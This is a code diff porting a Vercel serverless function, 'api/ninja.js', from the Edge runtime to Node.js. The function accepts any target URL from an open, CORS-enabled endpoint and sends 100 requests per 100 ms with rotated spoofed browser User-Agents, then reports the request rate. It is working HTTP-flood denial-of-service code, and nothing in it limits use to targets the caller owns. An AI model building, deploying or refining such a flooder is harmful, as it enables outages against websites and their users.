@@ -1,15 +1,11 @@
-// api/ninja.js — Vercel Edge Function
-// Ported from ninja.js. 100 requests per 100 ms interval.
-// Stops after <duration> seconds. Returns totals.
-
-export const config = { runtime: 'edge' };
+// api/ninja.js — Vercel Node.js Serverless Function
+// Ported from ninja.js. Fires 100 requests per 100 ms tick.
 
 const UA = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
 ];
-
 const pickUA = () => UA[Math.floor(Math.random() * UA.length)];
 
 const CORS = {
@@ -17,13 +13,6 @@ const CORS = {
   'Access-Control-Allow-Methods': 'POST, OPTIONS',
   'Access-Control-Allow-Headers': 'Content-Type',
 };
-
-function jsonResponse(data, status = 200) {
-  return new Response(JSON.stringify(data), {
-    status,
-    headers: { ...CORS, 'Content-Type': 'application/json' },
-  });
-}
 
 async function runTick(target) {
   const promises = [];
@@ -40,22 +29,33 @@ async function runTick(target) {
   return ok;
 }
 
-export default async function handler(req) {
-  if (req.method === 'OPTIONS') {
-    return new Response(null, { status: 204, headers: CORS });
-  }
-  if (req.method !== 'POST') {
-    return jsonResponse({ ok: false, msg: 'POST only' }, 405);
+module.exports = async (req, res) => {
+  // CORS
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  if (req.method === 'OPTIONS') return res.status(204).end();
+
+  if (req.method === 'GET') {
+    return res.status(200).json({ ok: true, relay: 'ninja', ts: Date.now() });
   }
 
-  let body = {};
-  try { body = await req.json(); } catch (e) { body = {}; }
+  if (req.method !== 'POST') {
+    return res.status(405).json({ ok: false, msg: 'POST only' });
+  }
+
+  let body = req.body;
+  if (typeof body === 'string') {
+    try { body = JSON.parse(body); } catch (e) { body = {}; }
+  }
+  if (!body || typeof body !== 'object') body = {};
 
   const target   = String(body.target || '').trim();
-  const duration = Math.min(Math.max(parseInt(body.duration, 10) || 10, 1), 25);
+  const duration = Math.min(Math.max(parseInt(body.duration, 10) || 5, 1), 9);
 
   if (!/^https?:\/\//i.test(target)) {
-    return jsonResponse({ ok: false, msg: 'bad target' }, 400);
+    return res.status(400).json({ ok: false, msg: 'bad target' });
   }
 
   const start = Date.now();
@@ -72,7 +72,7 @@ export default async function handler(req) {
 
   const elapsed = ((Date.now() - start) / 1000).toFixed(2);
 
-  return jsonResponse({
+  return res.status(200).json({
     ok: true,
     target,
     duration,
@@ -81,4 +81,4 @@ export default async function handler(req) {
     elapsed,
     rate: (total / (elapsed || 1)).toFixed(1),
   });
-}
+};
